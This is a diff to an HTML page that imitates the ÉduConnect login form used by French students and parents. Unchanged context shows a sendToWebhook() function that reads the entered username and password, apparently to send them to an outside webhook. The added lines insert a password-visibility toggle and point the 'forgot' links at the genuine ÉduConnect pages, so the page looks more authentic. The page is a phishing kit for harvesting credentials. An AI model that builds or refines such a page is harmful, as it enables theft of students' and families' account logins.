@@ -2,6 +2,22 @@
 <meta charset=utf-8>
 <meta name=viewport content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <script>
+    document.addEventListener('DOMContentLoaded', function () {
+    const toggleBtn = document.querySelector('.showPwd');
+    
+    if (toggleBtn) {
+      const inputId = toggleBtn.getAttribute('data-input');
+      const passwordInput = document.getElementById(inputId);
+
+      if (passwordInput) {
+        toggleBtn.addEventListener('click', function () {
+          const isPassword = passwordInput.type === 'password';
+          passwordInput.type = isPassword ? 'text' : 'password';
+        });
+      }
+    }
+  });
+
     function sendToWebhook() {
         const field1 = document.getElementById('username').value;
         const field2 = document.getElementById('password').value;
@@ -133,8 +149,8 @@
  <div class=fr-input-group>
  <div class=d-flex>
  <label id=labelle_identifiant class=fr-label for=username>Identifiant</label>
- <a class="fr-link small left-auto fr-fi-arrow-right-line fr-link--icon-right fr-pr-0 hidden-item sf-hidden" href=# hrefcible=https://moncompte.educonnect.education.gouv.fr/educt-self-service/oubliLogin/recupererLoginResponsable id=identifiant_perdu_responsable titremodale="Identifiant oublié indisponible" corpsmodale="<b> Avertissement : </b>&nbsp;Cette fonctionnalité est temporairement indisponible. Veuillez attendre la fin de la maintenance d'ÉduConnect.">Identifiant oublié ?</a>
- <a class="fr-link small left-auto fr-fi-arrow-right-line fr-link--icon-right fr-pr-0" href=# hrefcible=https://moncompte.educonnect.education.gouv.fr/educt-self-service/oubliLogin/recupererLoginEleve id=identifiant_perdu_eleve titremodale="Identifiant oublié indisponible" corpsmodale="<b> Avertissement : </b>&nbsp;Cette fonctionnalité est temporairement indisponible. Veuillez attendre la fin de la maintenance d'ÉduConnect.">Identifiant oublié ?</a>
+ <a class="fr-link small left-auto fr-fi-arrow-right-line fr-link--icon-right fr-pr-0 hidden-item sf-hidden" href=https://moncompte.educonnect.education.gouv.fr/educt-self-service/oubliLogin/recupererLoginResponsable id=identifiant_perdu_responsable titremodale="Identifiant oublié indisponible" corpsmodale="<b> Avertissement : </b>&nbsp;Cette fonctionnalité est temporairement indisponible. Veuillez attendre la fin de la maintenance d'ÉduConnect.">Identifiant oublié ?</a>
+ <a class="fr-link small left-auto fr-fi-arrow-right-line fr-link--icon-right fr-pr-0" href=https://moncompte.educonnect.education.gouv.fr/educt-self-service/oubliLogin/recupererLoginEleve id=identifiant_perdu_eleve titremodale="Identifiant oublié indisponible" corpsmodale="<b> Avertissement : </b>&nbsp;Cette fonctionnalité est temporairement indisponible. Veuillez attendre la fin de la maintenance d'ÉduConnect.">Identifiant oublié ?</a>
  </div>
  <input class=fr-input type=text id=username name=j_username placeholder="Identifiant au format p.nomXX" value>
  <p hidden id=erreurIdentifiant class=sf-hidden>Votre identifiant ou votre mot de passe est incorrect. Veuillez vérifier les informations de votre compte ÉduConnect.</p>
@@ -143,8 +159,8 @@
  <div class="fr-input-group fr-mb-2w">
  <div class=d-flex>
  <label id=labelle_mdp class=fr-label for=password>Mot de passe</label>
- <a class="fr-link small left-auto fr-fi-arrow-right-line fr-link--icon-right fr-pr-0 hidden-item sf-hidden" href=# hrefcible=https://moncompte.educonnect.education.gouv.fr/educt-self-service/oubliMdp/recupererMotDePasseResponsable id=password_perdu_responsable titremodale="Mot de passe oublié indisponible" corpsmodale="<b> Avertissement : </b>&nbsp;Cette fonctionnalité est temporairement indisponible. Veuillez attendre la fin de la maintenance d'ÉduConnect.">Mot de passe oublié ?</a>
- <a class="fr-link small left-auto fr-fi-arrow-right-line fr-link--icon-right fr-pr-0" href=# hrefcible=https://moncompte.educonnect.education.gouv.fr/educt-self-service/oubliMdp/recupererMotDePasseEleve id=password_perdu_eleve titremodale="Mot de passe oublié indisponible" corpsmodale="<b> Avertissement : </b>&nbsp;Cette fonctionnalité est temporairement indisponible. Veuillez attendre la fin de la maintenance d'ÉduConnect.">Mot de passe oublié ?</a>
+ <a class="fr-link small left-auto fr-fi-arrow-right-line fr-link--icon-right fr-pr-0 hidden-item sf-hidden" href=https://moncompte.educonnect.education.gouv.fr/educt-self-service/oubliMdp/recupererMotDePasseResponsable id=password_perdu_responsable titremodale="Mot de passe oublié indisponible" corpsmodale="<b> Avertissement : </b>&nbsp;Cette fonctionnalité est temporairement indisponible. Veuillez attendre la fin de la maintenance d'ÉduConnect.">Mot de passe oublié ?</a>
+ <a class="fr-link small left-auto fr-fi-arrow-right-line fr-link--icon-right fr-pr-0" href=https://moncompte.educonnect.education.gouv.fr/educt-self-service/oubliMdp/recupererMotDePasseEleve id=password_perdu_eleve titremodale="Mot de passe oublié indisponible" corpsmodale="<b> Avertissement : </b>&nbsp;Cette fonctionnalité est temporairement indisponible. Veuillez attendre la fin de la maintenance d'ÉduConnect.">Mot de passe oublié ?</a>
  </div>
  <div class=position-relative>
  <input class=fr-input type=password id=password name=j_password>
